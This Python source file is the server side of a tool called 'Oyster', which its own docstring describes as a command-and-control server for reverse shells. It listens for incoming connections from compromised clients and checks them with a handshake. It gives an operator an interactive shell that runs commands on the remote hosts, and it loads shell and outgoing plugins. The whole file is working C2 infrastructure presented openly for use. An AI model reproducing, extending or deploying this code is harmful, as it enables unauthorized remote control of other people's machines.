from __future__ import print_function
import sys
from time import sleep
import threading
import socket
import os
from os import execv
from common import PluginRunner
from common import safe_input
from common import LoopReturnEvent
from common import LoopContinueEvent
from common import LoopBreakEvent
from server_connection import HeaderServer, TerminatingServer
from server_connection import ConnectionManager


# todo: use curses for the command line prompt so the TAB key can be used like it is on unix systems.


def get_arg_dict(args):
    """
    Get a dictionary of keyword arguments.

    :param args:
    :return:
    """

    output = {
        'host': '',
        'port': 6667,
        'recv_size': 1024,
        'session_id': '',
        'echo': True,
    }
    for arg in args:
        if 'host=' in arg:
            output['host'] = arg.split('=')[1]
        elif 'port=' in arg:
            output['port'] = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            output['recv_size'] = int(arg.split('=')[1])
        elif 'listen=' in arg:
            output['listen'] = int(arg.split('=')[1].strip())
        elif 'bind_retry=' in arg:
            output['bind_retry'] = int(arg.split('=')[1].strip())
    return output


class ShutdownEvent(threading.Event):
    pass


class Server(PluginRunner):
    """
    A simple command and control server(Reverse Shell).
    """

    __file__ = sys.argv[0]

    def __init__(self, connection_type, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, header=True):
        self.header = header
        header = """\n .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'                         """
        if self.header:
            print(header, end='\n\n')
        self.host = host
        self.port = int(port)
        self.recv_size = int(recv_size)
        self.listen = int(listen)
        self.bind_retry = bind_retry

        self.socket = None
        self.reboot = False

        self.help_mode = False

        self.shutdown_event = None

        self.shell_plugins = []
        self.outgoing_plugins = []

        self.connection_type = connection_type
        self.connection_mgr = ConnectionManager(connection_type)
        self.create_socket()
        self.bind_socket()

    def create_socket(self):
        """
        Create the socket.

        :return:
        """

        try:
            self.socket = socket.socket()
            self.socket.setblocking(True)
        except socket.error as error_message:
            print('< Could not create socket:', error_message, '>')
            sys.exit()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return self.socket

    def bind_socket(self, attempts=1):
        """
        Bind the socket to the port.

        :return:
        """

        print('< Starting on port', self.port, end=', ')
        try:
            # Bind & start listening.
            self.socket.bind((self.host, self.port))
            self.socket.listen(self.listen)
            print('waiting for client connections. >')

        except socket.error as error_message:
            print('< Could not bind the socket:', error_message, '\n', 'Trying again. >')
            sleep(1)

            # Try to bind the socket 5 times before giving up.
            if attempts == self.bind_retry:
                print('< Could not bind the socket to the port after {} tries.  Aborting. >'.format(self.bind_retry))
                sys.exit()
            self.bind_socket(attempts=attempts + 1)
        return self

    def send_command(self, data, echo=False, encode=True, file_response=False):
        """
        Shortcut to send a command to the currently connected client in the connection manager.

        :param data:
        :param echo:
        :param encode:
        :param file_response:
        :return:
        """

        response = self.connection_mgr.send_command(data, echo=echo, encode=encode, file_response=file_response)
        return response

    def get_response(self, echo=False, decode=True):
        """
        Get a response from the current connection in the conneciton manager.

        :param echo:
        :param decode:
        :return:
        """

        return self.connection_mgr.current_connection.get_response(echo=echo, decode=decode)

    def listener(self, shutdown_event):
        """
        Start listening for connections.

        :return:
        """

        while not shutdown_event.is_set():
            try:
                conn, address = self.socket.accept()
            except socket.error as e:
                # Loop indefinitely
                continue

            # Check to see if the address is already connected.
            if address[0] in self.connection_mgr.connections.keys():
                continue

            conn_obj = self.connection_mgr.connection_type(conn, address, recv_size=self.recv_size)
            should_connect = conn_obj.send_command('oyster handshake {}'.format(self.connection_mgr.session_id))
            should_connect = True if should_connect == 'True' else False
            if should_connect:
                self.connection_mgr.add_connection(conn, address)
            else:
                conn_obj.close()
                break

            # Send the connection it's ip and port
            conn_obj.send_command('oyster set-ip {}'.format(address[0]))
            conn_obj.send_command('oyster set-port {}'.format(address[1]))

            print(
                '\r< [ Listener Thread ] {} ({}) connected. >\n{}'.format(
                    address[0],
                    address[1],
                    'Oyster> '
                ),
                end=''
            )
            shutdown_event.wait(.1)

        print('\n< [ Listener Thread ] Connections no longer being accepted! >')
        print('< [ Listener Thread ] Closing existing connections. >')
        if self.connection_mgr.connections:
            self.connection_mgr.close_all_connections()
        return

    def set_cli(self, the_string):
        """
        Set the command line to equal a certain string.

        :param the_string:
        :return:
        """

        print(the_string, end='')
        return self

    @staticmethod
    def list_remove(_list, item):
        try:
            _list.remove(item)
            return True
        except ValueError:
            return False

    def get_outgoing_plugins(self):
        """
        Dynamically import any outgoing_plugins in the `outgoing_plugins` package.
        :return:
        """

        plugin_list = []
        # Get the filepath of the outgoing plugins based on the filepath of the this file.
        fp = self.__file__.replace(self.__file__.split('/')[-1], '') + 'outgoing_plugins'
        # Get the names of the modules within the outgoing_plugins folder.
        module_names = [n.replace('.pyc', '').replace('.py', '') for n in os.listdir(fp) if '__init__.py' not in n]
        hidden_files = [n for n in os.listdir(fp) if n[0] == '.']
        module_names = [n for n in module_names if n not in hidden_files]

        Server.list_remove(module_names, '__pycache__')
        Server.list_remove(module_names, '.DS_Store')

        for module_name in module_names:
            # Import the module by name
            module = __import__('outgoing_plugins.' + module_name, fromlist=[''])
            # Add the module to the plugin list
            plugin_list.append(module)

        return plugin_list

    def get_shell_plugins(self):
        """
        Dynamically import any shell_plugins in the `shell_plugins` package.
        :return:
        """

        plugin_list = []
        # Get the filepath of the shell plugins based on the filepath of the this file.
        fp = self.__file__.replace(self.__file__.split('/')[-1], '') + 'shell_plugins'
        # Get the names of the modules within the shell_plugins folder.
        module_names = [n.replace('.pyc', '').replace('.py', '') for n in os.listdir(fp) if '__init__.py' not in n]

        Server.list_remove(module_names, '__pycache__')
        Server.list_remove(module_names, '.DS_Store')

        for module_name in module_names:
            # Import the module by name
            module = __import__('shell_plugins.' + module_name, fromlist=[''])
            # Add the module to the plugin list
            plugin_list.append(module)

        return plugin_list

    def start_client_shell(self, commands=None):
        """
        Open up a client shell using the current connection.

        :return:
        """

        self.outgoing_plugins = self.outgoing_plugins if self.outgoing_plugins else self.get_outgoing_plugins()
        self.connection_mgr.cwd = self.connection_mgr.send_command('oyster getcwd')
        while True:
            if self.connection_mgr.current_connection is None:
                return

            # Get the client IP to display in the input string along with the current working directory
            self.connection_mgr.cwd = self.connection_mgr.send_command('oyster getcwd')
            ip = self.connection_mgr.send_command('oyster get-ip')
            input_string = "<{}> {}".format(
                ip,
                self.connection_mgr.cwd
            )
            if self.connection_mgr.current_connection is None:
                return
            # If the connection was closed for some reason, return which will end the client shell.
            if self.connection_mgr.current_connection.status == 'CLOSED':
                return

            if not commands:
                # Get a command from the user using the crafted input string.
                command = safe_input(input_string)
                if command == '':
                    continue

                    # # # # # # # PROCESS PLUGINS # # # # # # #
                plugin_ran, obj = self.process_plugins(self.outgoing_plugins, command, help_mode_on=self.help_mode)
                if plugin_ran:
                    if isinstance(obj, LoopBreakEvent):
                        break
                    if isinstance(obj, LoopContinueEvent):
                        continue
                    if isinstance(obj, LoopReturnEvent):
                        return obj.value
                    continue
            else:
                breaks = False
                continues = False
                returns = False
                for command in commands:
                    plugin_ran, obj = self.process_plugins(self.outgoing_plugins, command, help_mode_on=self.help_mode)
                    if plugin_ran:
                        if isinstance(obj, LoopBreakEvent):
                            breaks = True
                        if isinstance(obj, LoopContinueEvent):
                            continues = True
                        if isinstance(obj, LoopReturnEvent):
                            returns = True, obj.value
                        continues = True

                if returns:
                    return returns[1]
                if breaks:
                    break
                if continues:
                    continue

            # Send command through.
            try:
                if not commands:
                    response = self.connection_mgr.send_command(command)
                else:
                    for command in commands:
                        print(self.connection_mgr.send_command(command), end='')
                    commands = None
                    continue
            except BrokenPipeError as err_msg:
                print('ERROR:', err_msg)
                break

            print(response, end='')
        return

    def open_oyster(self, commands=None):
        """
        Run the Oyster shell.

        :param commands:
        :return:
        """

        self.shell_plugins = self.shell_plugins if self.shell_plugins else self.get_shell_plugins()
        while True:
            if not commands:
                command = safe_input('\rOyster> ')
                # # # # # # # PROCESS PLUGINS # # # # # # #
                plugin_ran, obj = self.process_plugins(self.shell_plugins, command, help_mode_on=self.help_mode)
                if plugin_ran:
                    if isinstance(obj, LoopBreakEvent):
                        break
                    if isinstance(obj, LoopContinueEvent):
                        continue
                    if isinstance(obj, LoopReturnEvent):
                        return obj.value
                    continue
            else:
                breaks = False
                continues = False
                returns = False
                for command in commands:
                    plugin_ran, obj = self.process_plugins(self.shell_plugins, command, help_mode_on=self.help_mode)
                    if plugin_ran:
                        if isinstance(obj, LoopBreakEvent):
                            breaks = True
                        if isinstance(obj, LoopContinueEvent):
                            continues = True
                        if isinstance(obj, LoopReturnEvent):
                            returns = True, obj.value
                        continues = True

                commands = None
                if returns:
                    return returns[1]
                if breaks:
                    break
                if continues:
                    continue
        return

    def reboot_self(self):
        """
        Reboot the server.py script.

        :return:
        """

        restart_arguments = list(sys.argv)
        restart_arguments.insert(0, '')
        execv(sys.executable, restart_arguments)
        sys.exit()


if __name__ == '__main__':
    def main():
        # Set some default values.
        default_host = ''
        default_port = 6667
        default_recv_size = 1024
        default_listen = 10
        default_bind_retry = 5

        # Check all the command line arguments
        args = sys.argv[1:]
        if not args:
            args = [
                'host={}'.format(default_host),
                'port={}'.format(default_port),
                'recv_size={}'.format(default_recv_size),
                'listen={}'.format(default_listen),
                'bind_retry={}'.format(default_bind_retry)
            ]
        arg_dict = get_arg_dict(args)

        server = Server(
            HeaderServer,
            host=arg_dict['host'],
            port=arg_dict['port'],
            recv_size=arg_dict['recv_size'],
            listen=arg_dict['listen'],
            bind_retry=arg_dict['bind_retry'],
        )

        # Start the thread that accepts connections.
        shutdown_event = ShutdownEvent()
        connection_accepter = threading.Thread(name='server.listener', target=server.listener, args=(shutdown_event,))
        connection_accepter.setDaemon(True)
        connection_accepter.start()

        server.shutdown_event = shutdown_event

        # Load plugins
        print('')
        shell_plugins = server.get_shell_plugins()
        outgoing_plugins = server.get_outgoing_plugins()

        server.shell_plugins = shell_plugins
        server.outgoing_plugins = outgoing_plugins

        plugins_total = len(shell_plugins) + len(outgoing_plugins)
        print('< Loaded {} plugins. >'.format(plugins_total))

        # Start the Oyster Shell.
        server.open_oyster()

        # Handle the shutdown sequence.
        connection_accepter.join()

        print('< Shutdown complete! >')

    main()

